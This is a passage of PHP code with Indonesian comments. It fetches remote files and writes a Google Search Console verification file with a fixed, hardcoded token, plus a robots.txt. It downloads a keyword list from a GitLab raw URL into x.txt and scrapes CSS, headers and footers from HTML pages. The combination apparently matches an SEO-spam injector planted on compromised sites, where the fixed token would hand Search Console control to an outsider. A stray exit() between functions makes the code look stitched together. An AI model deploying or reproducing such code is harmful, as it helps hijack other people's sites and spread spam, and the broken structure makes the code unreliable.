function fetchRemoteFile($url)
{
    // Coba file_get_contents() terlebih dahulu
    $content = @file_get_contents($url);

    if ($content !== false) {
        return $content;
    }

    // Fallback ke cURL
    if (function_exists('curl_init')) {
        $ch = curl_init($url);

        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_CONNECTTIMEOUT => 10,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_USERAGENT => 'Mozilla/5.0',
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_SSL_VERIFYHOST => 2,
        ]);

        $content = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($content !== false && $httpCode >= 200 && $httpCode < 300) {
            return $content;
        }
    }

    return false;
}

/**
 * Auto-create file verifikasi Google Search Console
 */
function generateGSCVerification($filename = 'googlee198e4d83300e0d1.html')
{
    $content = 'google-site-verification: ' . $filename;

    if (file_put_contents($filename, $content) === false) {
        error_log("[GSC] Gagal membuat file verifikasi: {$filename}");
        return false;
    }

    error_log("[GSC] Berhasil membuat file verifikasi: {$filename}");
    return true;
}

/**
 * Auto-create robots.txt
 */
function generateRobotsTxt($domain_url, $sitemap_file = 'sitemap-index.xml')
{
    $robots  = "User-agent: *\n";
    $robots .= "Allow: /\n\n";
    $robots .= "Sitemap: {$domain_url}{$sitemap_file}\n";

    if (file_put_contents("robots.txt", $robots) === false) {
        error_log("[robots] Gagal membuat robots.txt");
        return false;
    }

    error_log("[robots] Berhasil membuat robots.txt");
    return true;
}

/**
 * Download remote keywords & simpan sebagai x.txt
 */
function downloadKeywordsAsXtxt(
    $remote_url = 'https://gitlab.com/wongwaras/docsli/-/raw/main/api.txt',
    $local_file = 'x.txt'
) {
    $content = fetchRemoteFile($remote_url);

    if ($content === false) {
        error_log("[download] Gagal fetch: {$remote_url}");
        return false;
    }

    if (file_put_contents($local_file, $content) === false) {
        error_log("[download] Gagal menulis file: {$local_file}");
        return false;
    }

    error_log("[download] Berhasil download & simpan ke {$local_file} (" . strlen($content) . " bytes)");
    return $content;
}

    exit();

// Function untuk extract CSS dari HTML - IMPROVED
function extractCSS($html, $base_url = '') {
    $css_content = '';

    // Extract internal <style> tags
    preg_match_all('/<style[^>]*>(.*?)<\/style>/is', $html, $style_matches);
    if (!empty($style_matches[1])) {
        $css_content .= "<style>\n" . implode("\n", $style_matches[1]) . "\n</style>\n";
    }

    // Extract SEMUA link tags dengan berbagai format
    preg_match_all('/<link\s+([^>]*?)>/i', $html, $link_matches);

    if (!empty($link_matches[1])) {
        foreach ($link_matches[1] as $link_attrs) {
            // Ambil href
            if (preg_match('/href\s*=\s*["\']?([^\s"\'>\]]+)["\']?/i', $link_attrs, $href_match)) {
                $css_url = trim($href_match[1]);

                // Filter: ambil yang CSS atau stylesheet
                $is_css = preg_match('/\.css/i', $css_url) ||
                         preg_match('/rel\s*=\s*["\']?stylesheet/i', $link_attrs) ||
                         preg_match('/rel\s*=\s*["\']?[^"\']*stylesheet[^"\']*["\']?/i', $link_attrs);

                if ($is_css && !empty(trim($css_url))) {
                    // Resolve relative URLs
                    if (!preg_match('/^(https?:|\/\/)/i', $css_url) && !empty($base_url)) {
                        $css_url = rtrim($base_url, '/') . '/' . ltrim($css_url, '/');
                    }

                    $css_content .= '<link rel="stylesheet" href="' . htmlspecialchars($css_url, ENT_QUOTES) . '">' . "\n";
                }
            }
        }
    }

    return $css_content;
}

// Function untuk extract HEADER dari HTML
function extractHeader($html) {
    if (preg_match('/<header\s[^>]*>.*?<\/header>/is', $html, $matches)) {
        return $matches[0];
    }
    if (preg_match('/<nav\s[^>]*>.*?<\/nav>/is', $html, $matches)) {
        return $matches[0];
    }
    return '';
}

// Function untuk extract FOOTER dari HTML
function extractFooter($html) {
    if (preg_match('/<footer[^>]*>.*?<\/footer>/is', $html, $matches)) {
        return $matches[0];
    }
    return '';
}
